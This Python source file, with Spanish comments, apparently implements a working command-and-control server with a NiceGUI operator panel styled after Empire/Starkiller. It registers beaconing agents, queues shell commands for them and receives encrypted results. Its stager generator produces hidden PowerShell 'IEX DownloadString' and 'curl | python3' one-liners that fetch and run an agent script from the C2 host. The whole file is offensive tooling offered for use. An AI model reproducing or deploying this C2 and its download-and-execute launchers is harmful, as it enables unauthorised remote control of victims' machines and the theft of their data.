from nicegui import ui, app
from fastapi import Request
import json, testingcrypto_c2

# Configuración estética estilo Starkiller
ui.dark_mode(True) 
ui.colors(primary='#10b981', secondary='#1e293b', accent='#06b6d4', dark='#0f172a')

# Variables de estado globales estrictas
current_view = 'dashboard'
active_agent_name = None  
current_os_target = 'Windows (PowerShell)'
current_selected_listener = 'HTTP_Real_C2'

# Diccionario global de agentes en memoria
if not hasattr(app, 'agents_db'):
    app.agents_db = {}

listeners_rows = [
    {'id': '1', 'name': 'HTTP_Real_C2', 'type': 'http', 'port': '8080', 'status': 'ACTIVE'}
]

# --- ENDPOINTS API PARA EL AGENTE REAL ---

@app.get('/api/beacon')
def agent_beacon(name: str, ip: str, os_type: str):
    if name not in app.agents_db:
        app.agents_db[name] = {
            "name": name,
            "ip": ip,
            "os": os_type,
            "status": "ONLINE",
            "pending_cmd": None,
            "history": [f"[*] Agent {name} registered from {ip}"]
        }
        for client in app.clients():
            with client:
                ui.notify(f"¡NUEVO AGENTE CONECTADO: {name}!", color='emerald-500', icon='gavel')
    else:
        app.agents_db[name]["status"] = "ONLINE"
        
    cmd_to_send = app.agents_db[name]["pending_cmd"]
    if cmd_to_send:
        app.agents_db[name]["pending_cmd"] = None
        return testingcrypto_c2.encrypt_data({"command": cmd_to_send})
        
    return {"command": None}

@app.post('/api/result')
async def agent_result(request: Request):
    encrypted_data = await request.json()

    data = testingcrypto_c2.decrypt_data(encrypted_data)

    name = data.get("name")
    result_text = data.get("result")
    
    if name in app.agents_db:
        app.agents_db[name]["history"].append(result_text)
        # Refrescamos el área de texto de la terminal si el operador está dentro
        for client in app.clients():
            with client:
                render_terminal_logs.refresh()
            
    return {"status": "success"}


# --- LÓGICA DE LA INTERFAZ (UI) ---

def execute_command():
    cmd = terminal_input.value.strip()
    if not cmd or not active_agent_name:
        return

    if cmd.lower() in ['clear', 'cls']:
        # Vaciar por completo la lista del historial de este agente en la memoria del servidor
        app.agents_db[active_agent_name]["history"] = [f"[*] Terminal cleared by operator."]
        terminal_input.value = ''
        render_terminal_logs.refresh()
        return
    
    msg = f"operator@c2:~# {cmd}"
    app.agents_db[active_agent_name]["history"].append(msg)
    app.agents_db[active_agent_name]["pending_cmd"] = cmd
    
    terminal_input.value = ''
    render_terminal_logs.refresh()

def open_terminal(agent_name):
    global active_agent_name
    active_agent_name = agent_name
    navigate_to('terminal')

def open_listener_wizard():
    with ui.dialog() as dialog, ui.card().classes('bg-slate-800 border border-slate-700 p-6 w-96 font-mono text-white'):
        ui.label('CREATE NEW LISTENER').classes('text-lg font-bold text-emerald-400 mb-2 tracking-wider')
        name_field = ui.input(label='Listener Name').classes('w-full mb-3').props('dark outlined')
        type_field = ui.select(options=['http', 'https'], value='http', label='Protocol').classes('w-full mb-3').props('dark outlined')
        port_field = ui.input(label='Bind Port').classes('w-full mb-4').props('dark outlined')
        
        def save():
            if name_field.value and port_field.value:
                listeners_rows.append({'id': str(len(listeners_rows)+1), 'name': name_field.value, 'type': type_field.value, 'port': port_field.value, 'status': 'ACTIVE'})
                dialog.close()
                render_content.refresh()
        with ui.row().classes('w-full justify-end gap-2'):
            ui.button('CANCEL', on_click=dialog.close).props('flat')
            ui.button('START', on_click=save, color='emerald')
    dialog.open()

def change_stager_os(e):
    global current_os_target
    current_os_target = e.value
    render_stager_payload.refresh()

def change_stager_listener(e):
    global current_selected_listener
    current_selected_listener = e.value
    render_stager_payload.refresh()

@ui.refreshable
def render_stager_payload():
    """Genera dinámicamente el código del exploit sin romper el navegador."""
    global current_os_target, current_selected_listener
    
    # Buscamos el puerto del listener activo de forma segura
    listener_data = next((l for l in listeners_rows if l['name'] == current_selected_listener), {'port': '8080'})
    c2_url = f"http://localhost:{listener_data['port']}"
    
    if "Windows" in current_os_target:
        payload = f'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'{c2_url}/api/download/agent.py\')"'
    else:
        payload = f'curl -s {c2_url}/api/download/agent.py | python3 -'
        
    with ui.card().classes('w-full bg-black p-4 rounded border border-slate-800 font-mono text-sm mt-4 text-white'):
        with ui.row().classes('w-full justify-between items-center mb-2 border-b border-slate-900 pb-2'):
            ui.label('GENERATED LAUNCHER // ONE-LINER').classes('text-xs text-slate-400 font-bold')
            ui.button(icon='content_copy', on_click=lambda: [ui.run_javascript(f'navigator.clipboard.writeText("{payload}")'), ui.notify('¡Payload copiado!', color='cyan')]).props('flat dense text-color=cyan')
        
        ui.label(payload).classes('text-cyan-400 break-all select-all font-semibold p-2')

# --- REFRESCOS VISUALES AISLADOS ---

@ui.refreshable
def render_terminal_logs():
    """Esta función SOLO refresca las líneas de texto internas, sin tocar el teclado."""
    if active_agent_name and active_agent_name in app.agents_db:
        for line in app.agents_db[active_agent_name]["history"]:
            if "operator@" in line:
                ui.label(line).classes('text-white font-bold')
            elif "[*]" in line:
                ui.label(line).classes('text-slate-400')
            else:
                ui.label(line).classes('text-emerald-400 whitespace-pre')

@ui.refreshable
def render_content():
    global current_view, active_agent_name, terminal_input
    
    if current_view == 'dashboard':
        ui.label('C2 DASHBOARD').classes('text-2xl font-mono text-emerald-400 mb-4')
        with ui.row().classes('w-full gap-4'):
            with ui.card().classes('bg-slate-800 p-4 border border-slate-700 flex-1'):
                ui.label('LISTENERS ACTIVOS').classes('text-xs text-slate-400 font-mono')
                ui.label(str(len(listeners_rows))).classes('text-4xl font-bold font-mono text-white')
            with ui.card().classes('bg-slate-800 p-4 border border-slate-700 flex-1'):
                ui.label('AGENTES CONECTADOS').classes('text-xs text-slate-400 font-mono')
                ui.label(str(len(app.agents_db))).classes('text-4xl font-bold font-mono text-emerald-400')

    elif current_view == 'listeners':
        ui.label('LISTENERS MANAGEMENT').classes('text-2xl font-mono text-emerald-400 mb-4')
        with ui.row().classes('justify-end w-full mb-2'):
            ui.button('NUEVO LISTENER', icon='add', on_click=open_listener_wizard)
        columns = [
            {'name': 'name', 'label': 'Nombre', 'field': 'name', 'align': 'left'},
            {'name': 'type', 'label': 'Tipo', 'field': 'type'},
            {'name': 'port', 'label': 'Puerto', 'field': 'port'},
            {'name': 'status', 'label': 'Estado', 'field': 'status'},
        ]
        ui.table(columns=columns, rows=listeners_rows, row_key='name').classes('w-full bg-slate-800 border border-slate-700 font-mono')

    elif current_view == 'agents':
        ui.label('REAL ACTIVE AGENTS').classes('text-2xl font-mono text-emerald-400 mb-4')
        if not app.agents_db:
            ui.label('Esperando conexiones de agentes reales...').classes('text-slate-500 font-mono italic')
        
        with ui.row().classes('w-full gap-4'):
            for name, agent in app.agents_db.items():
                with ui.card().classes('bg-slate-800 p-4 border-l-4 border-emerald-500 w-72'):
                    ui.label(agent['name']).classes('text-lg font-bold font-mono text-white')
                    ui.label(f"IP: {agent['ip']}").classes('text-xs text-slate-300 font-mono')
                    ui.label(f"OS: {agent['os']}").classes('text-xs text-slate-400')
                    with ui.row().classes('w-full justify-end mt-2'):
                        ui.button(icon='terminal', color='cyan', on_click=lambda n=name: open_terminal(n))

    elif current_view == 'terminal':
        with ui.row().classes('items-center gap-2 mb-2'):
            ui.button(icon='arrow_back', on_click=lambda: navigate_to('agents')).props('flat dense color=primary')
            ui.label(f"INTERACT // {active_agent_name}").classes('text-2xl font-mono text-cyan-400')
        
        # Contenedor de la consola estática externa
        with ui.element('div').classes('w-full bg-black p-4 rounded border border-slate-800 h-96 overflow-y-auto font-mono text-sm flex flex-col gap-1'):
            # Invocamos la subfunción dinámica que SOLO refresca las letras escritas
            render_terminal_logs()
                    
        # Al estar fuera de render_terminal_logs, este input NUNCA perderá el foco ni se borrará
        with ui.row().classes('w-full items-center gap-2 mt-4'):
            terminal_input = ui.input(placeholder='Escribe comando real (ej: dir, whoami, ipconfig)...').classes('flex-1 font-mono').props('dark outlined')
            terminal_input.on('keydown.enter', execute_command)
            ui.button('Send', icon='send', on_click=execute_command).props('flat').classes('text-cyan-400')

            def incline_clear():
                app.agents_db[active_agent_name]["history"] = [f"[*] Terminal cleared by operator."]
                render_terminal_logs.refresh()

            ui.button('Clear', icon='delete_sweep', on_click=incline_clear).props('flat').classes('text-rose-400')

    elif current_view == 'stagers':
        ui.label('STAGER GENERATOR (PAYLOADS)').classes('text-2xl font-mono text-emerald-400 mb-2')
        ui.label('Generate single-line delivery mechanisms for target initial access.').classes('text-sm text-slate-400 font-mono mb-6')

        with ui.row().classes('w-full gap-6 items-center'):
            # Menú de Sistema Operativo llamando a la nueva función externa
            ui.select(
                options=['Windows (PowerShell)', 'Linux (Bash / cURL)'],
                value=current_os_target,
                label='Target Operating System',
                on_change=change_stager_os
            ).classes('w-72 font-mono').props('dark outlined')

            # Menú de Listener llamando a la nueva función externa
            lister_names = [l['name'] for l in listeners_rows]
            ui.select(
                options=lister_names,
                value=current_selected_listener,
                label='Target C2 Listener',
                on_change=change_stager_listener
            ).classes('w-72 font-mono').props('dark outlined')

        # El cuadro negro corre perfectamente abajo sin colapsar la pantalla
        render_stager_payload()


def navigate_to(view_name):
    global current_view
    current_view = view_name
    render_content.refresh()


# --- MARCO GENERAL DEL PANEL ---
with ui.header().classes('bg-slate-900 border-b border-slate-700 items-center justify-between px-6 py-3'):
    ui.label('EMPIRE // STARKILLER PYTHON (REAL C2)').classes('font-black font-mono tracking-widest text-lg text-white')

with ui.left_drawer(value=True).classes('bg-slate-950 p-4 flex flex-col gap-2').props('width=260'):
    ui.button('Dashboard', icon='dashboard', on_click=lambda: navigate_to('dashboard')).props('flat align=left').classes('w-full font-mono text-white')
    ui.button('Listeners', icon='settings_input_antenna', on_click=lambda: navigate_to('listeners')).props('flat align=left').classes('w-full font-mono text-white')
    ui.button('Stagers', icon='gavel', on_click=lambda: navigate_to('stagers')).props('flat align=left').classes('w-full font-mono text-white')
    ui.button('Agents', icon='dns', on_click=lambda: navigate_to('agents')).props('flat align=left').classes('w-full font-mono text-white')

with ui.row().classes('w-full p-8 text-slate-100'):
    render_content()

# FUNCIÓN DE CHEQUEO INTELIGENTE
def smart_refresh():
    """Refresca la lista de agentes si estamos viéndola, o la terminal si hay respuestas."""
    if current_view in ['dashboard', 'agents']:
        render_content.refresh()
    elif current_view == 'terminal':
        render_terminal_logs.refresh()

# El temporizador ahora llama al refresco inteligente para no destruir inputs activos
ui.timer(3.0, smart_refresh)

ui.run(title="Starkiller Real C2", port=8080)
